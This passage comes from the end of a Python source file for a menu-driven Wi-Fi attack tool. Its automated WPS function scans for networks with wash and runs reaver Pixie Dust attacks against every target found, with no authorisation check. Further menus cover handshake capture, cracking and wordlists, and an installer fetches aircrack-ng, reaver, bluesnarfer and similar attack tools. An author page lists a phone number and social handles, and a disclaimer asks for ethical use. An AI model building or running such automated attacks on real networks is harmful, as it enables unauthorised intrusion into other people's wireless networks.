        self.log("Testing Pixie Dust vulnerability...", "INFO")
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def auto_wps_attack(self):
        """Automated WPS attack on multiple targets"""
        interface = self.get_interface()
        monitor_int = f"{interface}mon"
        
        self.log("Scanning for WPS-enabled networks...", "INFO")
        cmd = f"wash -i {monitor_int} -C -o {self.config.output_dir}/wps_scan.csv"
        self.run_command(cmd, timeout=60)
        
        # Parse WPS scan results
        csv_file = self.config.output_dir / "wps_scan.csv"
        if csv_file.exists():
            targets = []
            with open(csv_file, 'r') as f:
                for line in f:
                    if 'BSSID' in line or not line.strip():
                        continue
                    parts = line.split(',')
                    if len(parts) > 0 and ':' in parts[0]:
                        targets.append(parts[0].strip())
            
            self.log(f"Found {len(targets)} WPS targets", "INFO")
            
            for bssid in targets:
                self.log(f"Attacking {bssid}...", "INFO")
                cmd = f"reaver -i {monitor_int} -b {bssid} -vv -K 1 -t 2"
                self.run_command(cmd, timeout=120)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def system_information(self):
        """Display system information"""
        self.print_banner()
        print(f"{Colors.BOLD}{Colors.CYAN}System Information{Colors.RESET}\n")
        
        # Wireless adapters
        self.log("Wireless Adapters:", "INFO")
        self.run_command("iwconfig 2>/dev/null | grep -E '^[a-z]'", timeout=5)
        
        # Monitor mode status
        self.log("\nMonitor Mode Interfaces:", "INFO")
        self.run_command("iwconfig 2>/dev/null | grep -i monitor", timeout=5)
        
        # Installed tools
        self.log("\nInstalled Tools:", "INFO")
        tools = ["aircrack-ng", "reaver", "bully", "wifite", "hashcat", "john"]
        for tool in tools:
            result = self.run_command(f"which {tool} 2>/dev/null", timeout=5)
            if result:
                print(f"✓ {tool}")
            else:
                print(f"✗ {tool}")
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def main_menu(self):
        """Enhanced main menu"""
        while self.running:
            self.print_banner()
            print(f"""
{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                              MAIN MENU                                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}[01]{Colors.RESET} Start Monitor Mode
{Colors.GREEN}[02]{Colors.RESET} Stop Monitor Mode
{Colors.GREEN}[03]{Colors.RESET} Scan Networks
{Colors.GREEN}[04]{Colors.RESET} Capture Handshake
{Colors.GREEN}[05]{Colors.RESET} Advanced Cracking Menu
{Colors.GREEN}[06]{Colors.RESET} Advanced WPS Attacks
{Colors.GREEN}[07]{Colors.RESET} Advanced Wordlist Manager
{Colors.GREEN}[08]{Colors.RESET} Wireless Tools Installer
{Colors.GREEN}[09]{Colors.RESET} System Information
{Colors.GREEN}[10]{Colors.RESET} Generate Report

{Colors.YELLOW}[11]{Colors.RESET} About Me
{Colors.RED}[00]{Colors.RESET} Exit

{Colors.MAGENTA}═══════════════════════════════════════════════════════════════════════════════{Colors.RESET}
            """)
            
            choice = input(f"{Colors.CYAN}Enter your choice: {Colors.RESET}").strip()
            
            if choice == "01":
                self.start_monitor_mode()
            elif choice == "02":
                self.stop_monitor_mode()
            elif choice == "03":
                self.scan_networks()
            elif choice == "04":
                self.capture_handshake()
            elif choice == "05":
                self.advanced_cracking_menu()
            elif choice == "06":
                self.wps_attacks_advanced()
            elif choice == "07":
                self.advanced_wordlist_management()
            elif choice == "08":
                self.install_wireless_tools()
            elif choice == "09":
                self.system_information()
            elif choice == "10":
                self.generate_report()
            elif choice == "11":
                self.about_me()
            elif choice == "00":
                self.log("Goodbye! Stay ethical! 🔒", "SUCCESS")
                self.running = False
                break
            else:
                self.log("Invalid choice! Please try again.", "ERROR")
                time.sleep(2)
    
    def install_wireless_tools(self):
        """Enhanced wireless tools installation"""
        self.print_banner()
        print(f"{Colors.BOLD}{Colors.CYAN}Wireless Tools Installation{Colors.RESET}\n")
        
        tools = {
            "Basic": ["aircrack-ng", "reaver", "bully", "wifite", "pixiewps"],
            "Advanced": ["hashcat", "john", "crunch", "cupp", "kismet", "mdk3"],
            "Bluetooth": ["bluelog", "bluemaho", "bluepot", "blueranger", "bluesnarfer"]
        }
        
        for category, tool_list in tools.items():
            print(f"{Colors.GREEN}Installing {category} Tools...{Colors.RESET}")
            for tool in tool_list:
                self.log(f"Installing {tool}...", "INFO")
                self.run_command(f"apt-get install -y {tool}", timeout=120)
        
        # Install additional tools from git
        git_tools = [
            ("airgeddon", "https://github.com/v1s1t0r1sh3r3/airgeddon.git"),
            ("wifite2", "https://github.com/derv82/wifite2.git")
        ]
        
        for name, url in git_tools:
            self.log(f"Cloning {name}...", "INFO")
            self.run_command(f"git clone {url}", timeout=300)
        
        self.log("All tools installed successfully!", "SUCCESS")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def generate_report(self):
        """Generate penetration testing report"""
        self.print_banner()
        print(f"{Colors.BOLD}{Colors.CYAN}Generate Report{Colors.RESET}\n")
        
        report_file = self.config.output_dir / f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        
        # Collect information
        info = {
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "interface": self.config.interface,
            "handshakes": list(self.config.handshake_dir.glob("*.cap")),
            "logs": self.config.log_file
        }
        
        # Generate HTML report
        with open(report_file, 'w') as f:
            f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Penetration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: auto; background: white; padding: 20px; border-radius: 10px; }}
        h1 {{ color: #333; border-bottom: 3px solid #4CAF50; }}
        .info {{ background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        .handshake {{ background: #fff3e0; padding: 10px; margin: 10px 0; border-left: 4px solid #ff9800; }}
        .footer {{ text-align: center; margin-top: 40px; color: #666; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Wi-Fi Penetration Test Report</h1>
        <div class="info">
            <h3>Test Information</h3>
            <p><strong>Date:</strong> {info['date']}</p>
            <p><strong>Interface:</strong> {info['interface']}</p>
            <p><strong>Test Duration:</strong> {info['date']}</p>
        </div>
        
        <h3>Captured Handshakes</h3>
        {''.join([f'<div class="handshake"><strong>{h.name}</strong><br>{h}</div>' for h in info['handshakes']])}
        
        <h3>Log File</h3>
        <pre>{info['logs']}</pre>
        
        <div class="footer">
            <p>Generated by Advanced Wi-Fi Penetration Testing Framework</p>
            <p>Created by ATHEX</p>
        </div>
    </div>
</body>
</html>""")
        
        self.log(f"Report generated: {report_file}", "SUCCESS")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def about_me(self):
        """Display about information"""
        self.print_banner()
        print(f"""
{Colors.BOLD}{Colors.CYAN}About The Creator{Colors.RESET}
{Colors.WHITE}
═══════════════════════════════════════════════════════════════════════════════

{Colors.GREEN}Name:{Colors.RESET} ATHEX
{Colors.GREEN}Role:{Colors.RESET} Ethical Hacker & Cyber Security Researcher
{Colors.GREEN}Expertise:{Colors.RESET} Wi-Fi Security, Penetration Testing, Exploit Development

{Colors.GREEN}Social Media:{Colors.RESET}
  • WhatsApp: {Colors.CYAN}+92 349 0916663{Colors.RESET}
  • Instagram: {Colors.CYAN}@itx_athex86{Colors.RESET}
  • YouTube: {Colors.CYAN}inziXploit444{Colors.RESET}
  • GitHub: {Colors.CYAN}Coming Soon{Colors.RESET}

{Colors.GREEN}Mission:{Colors.RESET}
  "Educating about cybersecurity and promoting ethical hacking practices.
   Always use this tool for educational purposes and authorized testing only."

{Colors.YELLOW}⚠️  Disclaimer:{Colors.RESET}
  This tool is for educational purposes only. Unauthorized use against
  networks you don't own is illegal. The author is not responsible for
  any misuse of this tool.

{Colors.MAGENTA}Stay Ethical! Stay Secure! 🔒{Colors.RESET}
═══════════════════════════════════════════════════════════════════════════════
        """)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def run(self):
        """Main execution"""
        if not self.check_root():
            sys.exit(1)
        
        # Check and install dependencies
        deps_ok, missing = self.check_dependencies()
        if not deps_ok:
            self.log("Some dependencies are missing", "WARNING")
            install = input(f"{Colors.CYAN}Install missing tools? (y/n): {Colors.RESET}")
            if install.lower() == 'y':
                self.install_wireless_tools()
        
        # Start main menu
        self.main_menu()

if __name__ == "__main__":
    tool = WifiHackTool()
    tool.run()
